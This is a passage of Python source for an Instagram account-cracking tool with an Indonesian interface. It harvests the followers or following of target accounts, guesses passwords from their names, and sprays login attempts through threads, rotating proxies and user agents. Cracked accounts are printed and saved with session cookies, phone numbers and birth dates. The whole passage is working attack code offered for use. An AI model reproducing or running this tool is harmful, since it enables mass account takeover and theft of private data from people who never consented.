			zx=input(f' [+] Masukan Password : ')
			self.generateAPI(xnx,c,zx)
		else:
			self.passwordAPI(xnx)
			
	def generateAPI(self,user,o,zx=''):
		global prog,des
		xxkontol.append(Panel(f"""{H2}Hasil OK Ter Simpan Di {P2}:{P2}{day}.txt""",width=45,style=f"bold white"))
		xxkontol.append(Panel(f"""{K2}Hasil CP Ter Simpan Di {P2}:{P2}{day}.txt""",width=45,style=f"bold white"))
		console.print(Columns(xxkontol))
		prints(Panel(f"{P2}           Crack Di Mulai Tekan {color_rich}'Ctrl+Z'{P2} Di Keyboard Anda Jika Ingin Berhenti\n\n                  {P2}Hidupkan Mode Pesawat 5 Detik Jika Terdeteksi Spam IP",width=90,padding=(0,4),style=f"bold white"))
		anims = random.choice(["clock","smiley","monkey","moon","earth"])
		prog = Progress(SpinnerColumn(f'{anims}'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
		des = prog.add_task('',total=len(internal))
		with prog:
			with ThreadPoolExecutor(max_workers=15) as shinkai:
				for i in user:
					try:
						username=i.split("|")[0]
						password=i.split("|")[1].lower()
						for w in password.split(" "):
							if len(w)<3:
								continue
							else:
								w=w.lower()
								if o=="1":
									if len(w)==3 or len(w)==4 or len(w)==5:
										sandi=[w,w+'123',w+'1234',w+'321']
									else:
										sandi=[w,w+'123',w+'1234',w+'321']
								elif o=="2":
									if len(w)==3 or len(w)==4 or len(w)==5:
										sandi=[w,w+'123',w+'1234',w+'12345']
									else:
										sandi=[w,w+'123',w+'1234',w+'12345', password.lower()]
								elif o=="3":
									if len(w)==3 or len(w)==4 or len(w)==5:
										sandi=[w,w+'123',w+'1234',w+'321',w+'4321',w+'12345',w+'123456',password.lower()]
									else:
										sandi=[w,w+'123',w+'1234',w+'321',w+'4321',w+'12345',w+'123456',password.lower()]
								elif o=="4":
									if len(w)==3 or len(w)==4 or len(w)==5:
										sandi=[w,w+'123',w+'1234',w+'12',w+'321',w+'234',w+'4321',w+'12345',w+'123456',w+'1234567',password.lower()]
									else:
										sandi=[w,w+'123',w+'1234',w+'1',w+'2',w+'321',w+'4321',w+'12345',w+'123456',password.lower()]
								elif o=="5":
									if len(zx) > 3:
										sandi = zx.replace(" ", "").split(",")
							if 'satu' in method:
								shinkai.submit(self.crackAPI,username,sandi)
							elif 'dua' in method:
								shinkai.submit(self.new,username,sandi)
#										break
#					shinkai.submit(self.crackAPI,username,sandi)
					except:
						pass
		prints(Panel(f"  {P2}Crack {color_rich}{len(internal)} {P2}Username Selesai Hasil OK : {H2}{len(success)}{P2} Hasil CP : {K2}{len(checkpoint)}{P2} ",width=90,padding=(0,8),style=f"bold white"));time.sleep(4);exit()

	def APIinfo(self,user):
		try:
			x=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
			x_jason=x.json()["data"]["user"]
			nama=x_jason["full_name"]
			pengikut=x_jason["edge_followed_by"]["count"]
			mengikut=x_jason["edge_follow"]["count"]
			postingan=x_jason["edge_owner_to_timeline_media"]["count"]
		except:
			pass

		return nama,pengikut,mengikut,postingan

#------------------[ METODE API V1 ]-------------------#
	def crackAPI(self,user,pas):
		global loop,success,checkpoint
		ses=requests.Session()
		ua = random.choice(UserBrayCrack)
		prog.update(des,description=f"{H2}[API]{P2} {loop}/{len(internal)} OK-:{H2}{len(success)}{P2} CP-:{K2}{len(checkpoint)}{P2}")
		prog.advance(des)
		try:
			for pw in pas:
				brayennnxd=random.randint(1000000000, 99999999999)
				ts = calendar.timegm(current_GMT)
				proxy = {'http': 'socks5://'+random.choice(proxxy)}
				p = ses.get('https://i.instagram.com/api/v1/web/accounts/login/ajax/')
				head = {
                    'Host': 'i.instagram.com',
                    'Connection': 'keep-alive',
                    'Content-Length': '314',
                    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
                    'X-IG-App-ID': '1217981644879628',
                    'X-IG-WWW-Claim': '0',
                    'sec-ch-ua-mobile': '?1',
                    'X-Instagram-AJAX': '8a5016770d5c',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Accept': '*/*',
                    'X-Requested-With': 'XMLHttpRequest',
                    'X-ASBD-ID': '198387',
                    'User-Agent': ua,
                    'X-CSRFToken': p.cookies['csrftoken'],
                    'sec-ch-ua-platform': '"Android"',
                    'Origin': 'https://i.instagram.com',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Dest': 'empty',
                    'Referer': 'https://i.instagram.com/',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'}
				data = {
				    "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
				    "username": user,
				    "queryParams": "{}",
				    "optIntoOneTap": 'false',
				    "stopDeletionNonce": "",
				    "trustedDeviceRecords": "{}"}
				respon=ses.post("https://i.instagram.com/api/v1/web/accounts/login/ajax/", headers = head, data = data, proxies = proxy, allow_redirects = False)
				brayennnxd=json.loads(respon.text)
				if 'userId' in str(brayennnxd):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					cookie = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
					nomor, tanggal = self.ingfo(cookie)
					tree = Tree("")
					tree.add(Panel.fit(f"{H2}{user} {P2}| {H2}{pw}"))
					tree.add(f"{P2}Followers : {H2}{pengikut}")
					tree.add(f"{P2}Following : {H2}{mengikut}")
					tree.add(f"{P2}Nomor HP  : {H2}{nomor}")
					tree.add(f"{P2}Postingan : {H2}{postingan}")
					tree.add(f"{P2}Tanggal Lahir : {H2}{tanggal}").add(f"{N2}{cookie}{P2}\n")
					prints(tree)
					open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					success.append(user)
					break

				elif 'href="https://www.instagram.com/challenge/action/' in str(brayennnxd):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					tree = Tree("")
					tree.add(Panel.fit(f"{K2}{user} {P2}| {K2}{pw}"))
					tree.add(f"{P2}Followers : {K2}{pengikut}")
					tree.add(f"{P2}Following : {K2}{mengikut}")
					tree.add(f"{P2}Postingan : {K2}{postingan}").add(f"{K2}{USN}\n")
					prints(tree)
					open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					checkpoint.append(user)
					break
				elif "ip_block" in str(respon.text):
					prog.update(des,description=f"{M2}SpamIP{P2} {loop}/{len(internal)} OK-:{H2}{len(success)}{P2} CP-:{K2}{len(checkpoint)}{P2}")
					prog.advance(des)
					time.sleep(10)
					self.crackAPI(user,pas)
				else:
					continue
			loop+=1
		except requests.ConnectionError:
			time.sleep(10)
			
			
#------------------[ METODE API V2 ]-------------------#
	def new(self,user,pas):
		global loop,success,checkpoint
		ses=requests.Session()
		ua = random.choice(UserBrayCrack)
		prog.update(des,description=f"{H2}[AJAX]{P2} {loop}/{len(internal)} OK-:{H2}{len(success)}{P2} CP-:{K2}{len(checkpoint)}{P2}")
		prog.advance(des)
		try:
			for pw in pas:
				brayennnxd=random.randint(1000000000, 99999999999)
				ts = calendar.timegm(current_GMT)
				proxy = {'http': 'socks5://'+random.choice(proxxy)}
				p = ses.get('https://www.instagram.com/web/__mid')
				ses.headers.update({
                    'Host':'www.instagram.com',
                    'x-ig-www-claim':'0',
                    'x-instagram-ajax':'6543adcc6d29',
                    'content-type':'application/x-www-form-urlencoded',
                    'accept':'*/*',
                    'x-requested-with':'XMLHttpRequest',
                    'x-asbd-id':'198387',
                     'user-agent':ua,
                     'x-csrftoken':p.cookies['csrftoken'],
                     'x-ig-app-id':'1217981644879628',
                     'origin':'https://www.instagram.com',
                     'sec-fetch-site':'same-origin',
                     'sec-fetch-mode':'cors',
                     'sec-fetch-dest':'empty',
                     'referer':'https://www.instagram.com/accounts/onetap/',
                     'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})         
				data = {
           "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
			"username": user,
			"queryParams": "{}",
			"optIntoOneTap": 'false',
			"stopDeletionNonce": "",
			"trustedDeviceRecords": "{}"}
				respon=ses.post("https://www.instagram.com/accounts/login/ajax/", data=data, allow_redirects=True)
				brayennnxd=json.loads(respon.text)
				if 'userId' in str(brayennnxd):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					cookie = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
					nomor, tanggal = self.ingfo(cookie)
					tree = Tree("")
					tree.add(Panel.fit(f"{H2}{user} {P2}| {H2}{pw}"))
					tree.add(f"{P2}Followers : {H2}{pengikut}")
					tree.add(f"{P2}Following : {H2}{mengikut}")
					tree.add(f"{P2}Nomor HP  : {H2}{nomor}")
					tree.add(f"{P2}Postingan : {H2}{postingan}")
					tree.add(f"{P2}Tanggal Lahir : {H2}{tanggal}").add(f"{N2}{cookie}{P2}\n")
					prints(tree)
					open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					success.append(user)
					break

				elif 'href="https://www.instagram.com/challenge/action/' in str(brayennnxd):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					tree = Tree("")
					tree.add(Panel.fit(f"{K2}{user} {P2}| {K2}{pw}"))
					tree.add(f"{P2}Followers : {K2}{pengikut}")
					tree.add(f"{P2}Following : {K2}{mengikut}")
					tree.add(f"{P2}Postingan : {K2}{postingan}").add(f"{K2}{USN}\n")
					prints(tree)
					open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					checkpoint.append(user)
					break
				elif "ip_block" in str(respon.text):
					prog.update(des,description=f"{M2}SpamIP{P2} {loop}/{len(internal)} OK-:{H2}{len(success)}{P2} CP-:{K2}{len(checkpoint)}{P2}")
					prog.advance(des)
					time.sleep(10)
					self.new(user,pas)
				else:
					continue
			loop+=1
		except requests.ConnectionError:
			time.sleep(10)
			
	def checkAPI(self,usr,pwd):
		try:
			ts = calendar.timegm(current_GMT)
			ses=requests.Session()
			proxy = {'http': 'socks5://'+random.choice(prox_xyaa)}
			ua_brayen = USN
			token=s.get("https://i.instagram.com/accounts/login",headers={"user-agent":self.ua_igeh()}).content
			crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
			s.headers.update({
				'authority': 'www.instagram.com',
				'connection': 'keep-alive',
				'sec-ch-ua': '";Not A Brand";v="99", "Chromium";v="94"',
				'x-ig-app-id': '1217981644879628',
                'x-ig-www-claim': 'hmac.AR3jlStdcYspw88nLWvVnCDdiZ-KPvru_TasoSJlzGz-iXV2',
                 'x-requested-with': 'XMLHttpRequest',
				'sec-ch-ua-mobile': '?1',
				'x-instagram-ajax': 'c6412f1b1b7b',
				'content-type': 'application/x-www-form-urlencoded',
				'accept': '*/*',
				'x-csrftoken': crf_token,
				'user-agent': ua_brayen,
				'x-asbd-id': '198387',
				'sec-ch-ua-platform': '"Android"',
				'origin': 'https://www.instagram.com',
				'sec-fetch-site': 'same-origin',
				'sec-fetch-mode': 'cors',
				'sec-fetch-dest': 'empty',
				'referer': 'https://www.instagram.com/',
				'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'
			})

			param={
				"enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pwd}",
					"username": usr,
					"optIntoOneTap": False,
					"queryParams": "{}",
					"stopDeletionNonce": "",
					"trustedDeviceRecords": "{}"
			}
			x=s.post("https://i.instagram.com/accounts/login/ajax/",data=param,proxies=proxy)
			x_jason=json.loads(x.text)
			if "userId" in x.text:
				nama,pengikut,mengikut,postingan=self.APIinfo(usr)
				print(f"""
    ├ {CY} Live{N}
	├ {CY}{usr}|{pwd}
	├ Followers {CY}{pengikut}
	├ Following {CY}{mengikut}
	├ Posts
	 ∟ jumlah Post {CY}{postingan}""")
			elif 'checkpoint_url' in x.text:
				nama,pengikut,mengikut,postingan=self.APIinfo(usr)
				print(f"""
    ├ {K}Checkpoint{N}
	├ {K}{usr}|{pwd}
	├ Followers {K}{pengikut}
	├ Following {K}{mengikut}
	├ Posts
     ∟ jumlah Post {K}{postingan}""")
			elif 'Please Wait A Few Minutes' in str(x.text):
				sys.stdout.write(f"\r {U}!{C}] {U}Please Wait A Few Minutes Second{C}");sys.stdout.flush();sleep(10)
				self.checkAPI(usr,pwd)
		except:
			self.checkAPI(usr,pwd)

	def menu(self):
		self.logo()
		c=input(f' [+] Pilih : ')
		if c=='':
			prints(Panel(f"{P2}Pilih Yang Bener Broo Jangan Kosong !",width=90,padding=(0,19),style=f"bold white"));time.sleep(3);exit()
		elif c in ('1','01'):
			error()

		elif c in ('2','02'):
			mas=input(f' [+] Apakah Anda Ingin Crack Masal Y/t : ')
			if mas in ['y','Y']:
				masal(self)
			elif mas in ['t','T']:
				massal(self)
			elif mas in ['']:
				print(" Y/t Bro Jangan Kosong")


		elif c in ('3','03'):
			mas=input(f' [+] Apakah Anda Ingin Crack Masal Y/t : ')
			if mas in ['y','Y']:
				mengi(self)
			elif mas in ['t','T']:
				meng(self)
			elif mas in ['']:
				print(" Y/t Bro Jangan Kosong")


		elif c in ('4','04'):
			error()
			
		elif c in ('5','05'):
			print('')
			for i in os.listdir('result'):
				prints(Panel(f"{P2}Hasil Crack : {color_rich}{i}",width=90,style=f"bold white"))
			c=input(f' [+] Masukan Nama File : ')
			g=open("result/%s"%(c)).read().splitlines()
			xx=c.split("-")
			xc=xx[0]
			print(f' Total Results : {H}{len(g)}{C}')
			for s in g:
				usr=s.split("|")[0]
				pwd=s.split("|")[1]
				fol=s.split("|")[2]
				ful=s.split("|")[3]
				if xc=="checkpoint":
					print(f"""
 [+] Checkpoint :
 [+] Username: {usr}
 [+] Password: {pwd}
 [+] Followers: {fol}
 [+] Following: {ful}
					""");sleep(0.05)
				else:
					print(f"""
 [+] Live :
 [+] Username : {usr}
 [+] Password : {pwd}
 [+] Pengikut : {fol}
 [+] Mengikuti : {ful}
					""");sleep(0.05)
		elif c in ('6','06'):
			error()
		elif c in ('0','00'):
			self.Exit() 
	

		else:
			exit()

#----------[ CRACK MASSAL MENGIKUTI ]---------- #
def mengi(self):
			try:
				menudump.append('mengikuti')
				m=int(input(f' [+] Jumlah Target : {N}'))
			except:m=1
			prints(Panel(f"{P2}Pastikan Username Target Yang Di Pilih Bersifat Publik Dan Jangan Private",width=90,style=f"bold white"))
			for t in range(m):
				t +=1
				nama=input(f' [+] Username Target : {C}')
				id=self.idAPI(self.cookie,nama)
				info=self.ifoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
			self.passwordAPI(info)

#-----------------[ CRACK MENGIKUTI ]-----------------#
def meng(self):
	try:
		menudump.append('mengikuti')
		prints(Panel(f"{P2}Pastikan Username Target Yang Di Pilih Bersifat Publik Dan Jangan Private",width=90,style=f"bold white"))
		m=input(f' [+] Username Target : ')
		print(f" [+] Wait Collect Username {m}")
		id=self.idAPI(self.cookie,m)
		info=self.ifoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
		self.passwordAPI(info)
	except Exception as e:
		print(e)

#-----------------[ CRACK MASSAL PENGIKUT ]----------------- #
def masal(self):
			try:
				menudump.append('pengikut')
				m=int(input(f' [+] Jumlah Target : {N}'))
			except:m=1
			prints(Panel(f"{P2}Pastikan Username Target Yang Di Pilih Bersifat Publik Dan Jangan Private",width=90,style=f"bold white"))
			for t in range(m):
				t +=1
				nama=input(f' [+] Username Target : {C}')
				id=self.idAPI(self.cookie,nama)
				info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
			self.passwordAPI(info)

#-----------------[ CRACK PENGIKUT ]-----------------#
def massal(self):
			menudump.append('pengikut')
			prints(Panel(f"{P2}Pastikan Username Target Yang Di Pilih Bersifat Publik Dan Jangan Private",width=90,style=f"bold white"))
			m=input(f' [+] Username Target : {C}')
			print(f" [+] Wait Collect Username {m}")
			id=self.idAPI(self.cookie,m)
			info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
			self.passwordAPI(info)

#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('data')
	except:pass
	try:os.system('result')
	except:pass
	try:os.mkdir('/sdcard/DUMP-FILE')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('clear')
	except:pass
	login()